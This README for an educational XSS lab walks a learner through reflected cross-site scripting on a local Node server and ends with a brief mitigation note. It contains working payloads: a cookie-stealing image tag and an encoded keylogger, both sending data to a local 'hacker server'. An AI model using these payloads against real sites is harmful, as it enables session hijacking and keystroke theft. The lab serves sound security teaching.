# Cross-site Scripting (XSS)
Cross-site scripting vulnerabilities in action.

## Requirements
* [Node.js](https://nodejs.org/en/):
  * Mac/Linux - Use [nvm](https://github.com/creationix/nvm) to install node

## Getting Started
Mac users, open Terminal.
In your terminal program, use git to download the project:
```bash
git clone https://github.com/fnev081299/CT6043_XSS.git
```

Go to xss directory:
```bash
cd xss
```

Install dependencies using npm:
```bash
npm install
```

Run the local web server using Node.js:
```bash
node server.js
```
If successful, message: `Server at localhost:3000` is shown. The server is is now listening for requests at [localhost:3000](http://localhost:3000/).

## Test the server site:
Enter something in the textbox then press enter. Notice how the search query you entered is shown in the page.


## XSS:
[OWASP](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) for more information.


## Testing:
Open the developer tools in browser and open the "Console" sub-tab.

Copy/paste and run:
```js
encodeURIComponent('<img src="does-not-exist" onerror="alert(\'hi!\')">');
```

Paste the output into the address bar:
```
http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('Potential XSS!')%22%3E
```
Or click [this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert('Potential XSS')%22%3E).

You should see an alert :: "Potential XSS!".


## Vulnerability
Open the "Application" sub-tab in your browser's developer tools. Under "Storage" -> "Cookies", click "localhost:3000" to show the cookies being saved by the browser for this website.

The cookie named "connect.sid" is a session cookie set by the local web server. Repeat the steps from the "Testing" section, but with:
```html
<img src="does-not-exist" onerror="alert(document.cookie)">
```
Encode and use, or [use this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22alert(document.cookie)%22%3E).

The session cookie is printed in an alert pop-up.

Start the "Hacker Server":
```bash
node hacker_server.js
```

Steal the session cookie:
```html
<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); img.src = \'http://localhost:3001/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
```
Encode the above HTML and use it as the search query, or [try this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%27img%27)%3B%20img.src%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E).

Check the terminal window of the hacker server for the view of the cookie. 

Encode the above HTML and use, or [use this link](http://localhost:3000/?q=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20timeout%3B%20var%20buffer%20%3D%20%27%27%3B%20document.querySelector(%27body%27).addEventListener(%27keypress%27%2C%20function(event)%20%7B%20if%20(event.which%20!%3D%3D%200)%20%7B%20clearTimeout(timeout)%3B%20buffer%20%2B%3D%20String.fromCharCode(event.which)%3B%20timeout%20%3D%20setTimeout(function()%20%7B%20var%20xhr%20%3D%20new%20XMLHttpRequest()%3B%20var%20uri%20%3D%20%27http%3A%2F%2Flocalhost%3A3001%2Fkeys%3Fdata%3D%27%20%2B%20encodeURIComponent(buffer)%3B%20xhr.open(%27GET%27%2C%20uri)%3B%20xhr.send()%3B%20buffer%20%3D%20%27%27%3B%20%7D%2C%20400)%3B%20%7D%20%7D)%3B%22%3E).

## Mitigation
At the root, the XSS vulnerability is caused by inserting unsafe ("unescaped") HTML. In the `public/index.html` file, change the "Results" (the `q` parameter) strictly as text content. Uncomment the safe "Results" and comment out the other to see the secure versrion.
